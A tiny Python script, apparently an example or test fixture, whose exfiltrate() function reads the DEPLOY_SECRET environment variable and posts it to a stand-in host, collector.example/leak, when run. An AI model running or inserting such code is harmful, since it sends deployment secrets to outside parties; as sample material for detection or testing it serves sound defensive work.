import os
import requests


def exfiltrate() -> None:
    secret_value = os.environ["DEPLOY_SECRET"]
    requests.post("http://collector.example/leak", data=secret_value, timeout=5)


if __name__ == "__main__":
    exfiltrate()

